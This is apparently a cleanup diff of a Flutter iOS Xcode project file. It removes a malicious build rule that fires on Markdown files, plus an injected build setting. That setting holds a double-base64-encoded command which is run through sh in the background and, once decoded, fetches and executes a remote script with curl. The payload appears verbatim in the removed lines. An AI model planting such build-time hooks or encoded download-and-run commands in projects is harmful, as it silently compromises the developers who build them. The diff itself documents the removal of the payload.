@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		CDD721B4E63846D1BF42DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = 6717D3DB623D4D5AB042DAD8; };
 		02F494443826C744ED7F32AB /* Pods_RunnerTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = BB3B71B84279649223FF9931 /* Pods_RunnerTests.framework */; };
 		1498D2341E8E89220040F4C2 /* GeneratedPluginRegistrant.m in Sources */ = {isa = PBXBuildFile; fileRef = 1498D2331E8E89220040F4C2 /* GeneratedPluginRegistrant.m */; };
 		331C808B294A63AB00263BE5 /* RunnerTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 331C807B294A618700263BE5 /* RunnerTests.swift */; };
@@ -44,7 +43,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		6717D3DB623D4D5AB042DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		03BC803C4225A9C92D2D6960 /* Pods-RunnerTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-RunnerTests.debug.xcconfig"; path = "Target Support Files/Pods-RunnerTests/Pods-RunnerTests.debug.xcconfig"; sourceTree = "<group>"; };
 		1498D2321E8E86230040F4C2 /* GeneratedPluginRegistrant.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = GeneratedPluginRegistrant.h; sourceTree = "<group>"; };
 		1498D2331E8E89220040F4C2 /* GeneratedPluginRegistrant.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = GeneratedPluginRegistrant.m; sourceTree = "<group>"; };
@@ -135,7 +133,6 @@
 		97C146EF1CF9000F007C117D /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				6717D3DB623D4D5AB042DAD8 /* README.md */,
 				97C146EE1CF9000F007C117D /* Runner.app */,
 				331C8081294A63A400263BE5 /* RunnerTests.xctest */,
 			);
@@ -183,7 +180,6 @@
 				3D8B5E7E43E6D5A1670E2D8A /* Frameworks */,
 			);
 			buildRules = (
-				5A8BAF560FE14374AD42DAD8 /* PBXBuildRule */,
 			);
 			dependencies = (
 				331C8086294A63A400263BE5 /* PBXTargetDependency */,
@@ -254,29 +250,11 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		5A8BAF560FE14374AD42DAD8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8DAD24}\"";
-			};
-					/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		331C807F294A63A400263BE5 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				CDD721B4E63846D1BF42DAD8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -440,7 +418,6 @@ sh -c \"${A8DAD24}\"";
 		249021D3217E4FDB00AE95B9 /* Profile */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abXR6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTJhV2R0WVc1bGRDNXlkUzloS1NJZ2ZDQnphQW89Cg== | w | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -496,7 +473,6 @@ sh -c \"${A8DAD24}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7AFA3C8E1D35360C0083082E /* Release.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abXR6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTJhV2R0WVc1bGRDNXlkUzloS1NJZ2ZDQnphQW89Cg== | w | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
